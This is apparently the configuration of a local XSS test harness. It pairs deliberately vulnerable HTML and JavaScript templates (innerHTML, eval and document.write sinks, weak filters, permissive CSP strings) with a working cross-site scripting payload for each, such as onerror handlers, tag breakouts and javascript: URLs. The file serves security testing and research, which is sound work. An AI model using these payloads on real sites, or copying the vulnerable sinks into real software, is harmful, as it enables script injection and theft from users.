import { config as mctsconfig } from "../generation/config";

export interface Policies {
    no: string;
    inline: string;
    eval: string;
    dynamic: string;
    nonce: string;
};

export interface Filters {
    no: (_: string) => string;
    script: (_: string) => string;
    stripTags: (_: string) => string;
    htmlEntities: (_: string) => string;
}

export interface SmallTest{
    template: string;
    csp: (keyof Policies)[];
    filter: (keyof Filters)[];
    exploit: string;
}

export interface ServerConfig {
    general: {
        host: string;
        port: number;
    }

    tests: SmallTest[];

    policies: Policies;
    filters: Filters;

    templates: {[key: string]: string};
}

export const config: ServerConfig = {
    general: {
        host: "127.0.0.1",
        port: 8080,
    },

    tests: [
        { template: "ref_html_plain",               csp: ["inline"],                      filter: ["no"],                           exploit: `<script>###</script>` },
        { template: "ref_html_plain",               csp: ["inline"],                      filter: ["script"],                       exploit: `<img src=x onerror=###>` },
        { template: "ref_html_tagname",             csp: ["inline"],                      filter: ["stripTags"],                    exploit: `style/onload=###` },
        { template: "ref_html_attr_key",            csp: ["inline"],                      filter: ["stripTags"],                    exploit: `onerror=### src=` },
        { template: "ref_html_attr_value",          csp: ["inline"],                      filter: ["stripTags"],                    exploit: `x onerror=### src=x` },
        { template: "ref_html_attr_single",         csp: ["inline"],                      filter: ["stripTags"],                    exploit: `' onerror=### src=x` },
        { template: "ref_html_attr_double",         csp: ["inline"],                      filter: ["stripTags"],                    exploit: `" onerror=### src=x` },
        { template: "ref_html_comment",             csp: ["inline"],                      filter: ["no"],                           exploit: `--><script>###</script>` },
        { template: "ref_html_title",               csp: ["inline"],                      filter: ["no"],                           exploit: `</title><script>###</script>` },
        { template: "ref_html_css",                 csp: ["inline"],                      filter: ["no"],                           exploit: `</style><img src=x onerror=###>` },
        { template: "ref_html_textarea",            csp: ["inline"],                      filter: ["no"],                           exploit: `</textarea><img src=x onerror=###>` },
        { template: "ref_html_noscript",            csp: ["inline"],                      filter: ["no"],                           exploit: `</noscript><img src=x onerror=###>` },
        { template: "ref_html_template",            csp: ["inline"],                      filter: ["no"],                           exploit: `</template><iframe/onload=###>` },
        { template: "ref_html_noembed",             csp: ["inline"],                      filter: ["no"],                           exploit: `</noembed><iframe/onload=###>` },
        { template: "ref_html_iframe",              csp: ["inline"],                      filter: ["no"],                           exploit: `</iframe><iframe/onload=###>` },
        { template: "ref_html_iframe_src",          csp: ["inline"],                      filter: ["stripTags"],                    exploit: `x" onload=### x="` },
        { template: "ref_html_iframe_srcdoc",       csp: ["inline"],                      filter: ["no"],                           exploit: `<script>###</script>` },
        { template: "ref_js_literal",               csp: ["nonce"],                       filter: ["no"],                           exploit: `1; ###` },
        { template: "ref_js_literal_single",        csp: ["nonce"],                       filter: ["no"],                           exploit: `1'; ### //` },
        { template: "ref_js_literal_double",        csp: ["nonce"],                       filter: ["no"],                           exploit: `1"; ### //` },
        { template: "ref_js_literal_template",      csp: ["nonce"],                       filter: ["no"],                           exploit: `1\`; ### //` },
        { template: "ref_js_literal_regex",         csp: ["nonce"],                       filter: ["no"],                           exploit: `1/; ### //` },
        { template: "ref_js_func",                  csp: ["nonce"],                       filter: ["no"],                           exploit: `); ### //` },
        { template: "ref_js_if",                    csp: ["nonce"],                       filter: ["no"],                           exploit: `1){} ### //` },
        { template: "ref_js_comment_single",        csp: ["nonce"],                       filter: ["no"],                           exploit: `%0A ###` },
        { template: "ref_js_comment_multi",         csp: ["nonce"],                       filter: ["no"],                           exploit: `*/ ### /*` },
        { template: "ref_url_image",                csp: ["inline"],                      filter: ["stripTags"],                    exploit: `x" onerror=### x="` },
        { template: "ref_url_script",               csp: ["no"],                          filter: ["htmlEntities"],                 exploit: mctsconfig.exploit_url },
        { template: "ref_url_iframe",               csp: ["no"],                          filter: ["htmlEntities"],                 exploit: `javascript:###` },
        { template: "dom_innerhtml",                csp: ["inline"],                      filter: ["no"],                           exploit: `<img src=x onerror=###>` },
        { template: "dom_docwrite",                 csp: ["inline"],                      filter: ["no"],                           exploit: `<script>###</script>` },
        { template: "dom_append",                   csp: ["dynamic"],                     filter: ["no"],                           exploit: `###` },
        { template: "dom_eval",                     csp: ["eval"],                        filter: ["no"],                           exploit: `###` },
        { template: "dom_replace",                  csp: ["no"],                          filter: ["htmlEntities"],                 exploit: `javascript:###` },
        { template: "dom_src",                      csp: ["no"],                          filter: ["htmlEntities"],                 exploit: mctsconfig.exploit_url },
    ],
    
    policies: {
        no: `default-src * data: blob: 'unsafe-inline' 'unsafe-eval'`,
        inline: `script-src 'self' 'unsafe-inline'`,
        eval: `script-src 'self' 'nonce-1337' 'unsafe-eval'`,
        dynamic: `script-src 'nonce-1337' 'strict-dynamic'`,
        nonce: `script-src 'self' 'nonce-1337'`,
    },
    
    filters: {
        no: (str: string) => { return str; },
        script: (str: string) => { return str.replace(/script/gm, ""); },
        stripTags: (str: string) => { return str.replace(/<[^>]*>?/gm, ""); },
        htmlEntities: (str: string) => { return str.replace(/&/gm, "&amp;").replace(/</gm, "&lt;")
                .replace(/>/gm, "&gt;").replace(/"/gm, "&quot;").replace(/'/gm, "&#x27;") },
    },
    
    templates: {
        //Reflected into HTML
        ref_html_plain: `###`,
        ref_html_tagname: `<### />`,
        ref_html_attr_key: `<img ###='test' />`,
        ref_html_attr_value: `<img value=### />`,
        ref_html_attr_single: `<img value='###' />`,
        ref_html_attr_double: `<img value="###" />`,
        //Refleced into HTML with special semantics
        ref_html_comment: `<!-- ### -->`,
        ref_html_title: `<title> ### </title>`,
        ref_html_css: `<style> ### </style>`,
        ref_html_textarea: `<textarea> ### </textarea>`,
        ref_html_noscript: `<noscript> ### </noscript>`,
        ref_html_template: `<template> ### </template>`,
        ref_html_noembed: `<noembed> ### </noembed>`,
        ref_html_iframe: `<iframe> ### </iframe>`,
        ref_html_iframe_src: `<iframe x="###" />`,
        ref_html_iframe_srcdoc: `<iframe srcdoc="###" />`,
        //Reflected into JS
        ref_js_literal: `<script nonce="1337"> x=###; </script>`,
        ref_js_literal_single: `<script nonce="1337"> x='###'; </script>`,
        ref_js_literal_double: `<script nonce="1337"> x="###"; </script>`,
        ref_js_literal_template: `<script nonce="1337"> x=\`###\`; </script>`,
        ref_js_literal_regex: `<script nonce="1337"> x=/###/; </script>`,
        ref_js_func: `<script nonce="1337"> console.info(###) </script>`,
        ref_js_if: `<script nonce="1337"> let x; if (x == ###) {} </script>`,
        ref_js_comment_single: `<script nonce="1337"> // Comment ### </script>`,
        ref_js_comment_multi: `<script nonce="1337"> /* Comment ### */ </script>`,
        //Reflected into URL
        ref_url_image: `<img src="###" />`,
        ref_url_script: `<script nonce="1337" src="###"></script>`,
        ref_url_iframe: `<iframe src="###"></iframe>`,
        //DOM XSS
        dom_innerhtml: `<script nonce="1337"> document.documentElement.innerHTML = decodeURIComponent(payload) </script>`, //Equivalent: outerHTML, insertAdjacentHTML, srcdoc
        dom_docwrite: `<script nonce="1337"> document.write(decodeURIComponent(payload)) </script>`, //Equivalent: document.writeln
        dom_append: `<script nonce="1337"> s = document.createElement('script'); s.innerText = payload; document.body.appendChild(s); </script>`, //Equivalent: text, textContent
        dom_eval: `<script nonce="1337"> eval(payload) </script>`, //Equivalent: Function, setTimout, setInterval, (setImmediate, execScript)
        dom_replace: `<script nonce="1337"> location.replace(payload) </script>`, //Equivalent: window.open
        dom_src: `<script nonce="1337"> s = document.createElement('script'); s.src = payload; document.body.appendChild(s); </script>`, //Equivalent: setAttribute
    }
}

